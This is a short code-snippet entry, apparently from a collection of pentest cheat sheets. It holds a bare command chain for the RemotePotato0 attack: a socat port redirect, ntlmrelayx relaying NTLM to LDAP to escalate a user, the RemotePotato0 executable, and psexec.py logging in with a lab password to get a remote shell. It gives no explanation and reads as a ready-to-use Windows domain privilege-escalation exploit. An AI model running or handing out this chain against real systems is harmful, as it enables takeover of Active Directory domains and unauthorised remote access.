---
id: 62ab269a-8b80-41f5-a047-fbda66fe4170
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:05.609091+00:00'
updated_at: '2023-04-10T20:26:29.616838+00:00'
---

# Code Snippet 62ab269a

**Language**: Powershell

```powershell
# https://github.com/antonioCoco/RemotePotato0/
Terminal> sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 & # Can be omitted for Windows Server <= 2016
Terminal> sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
Session0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2
Terminal> psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
```
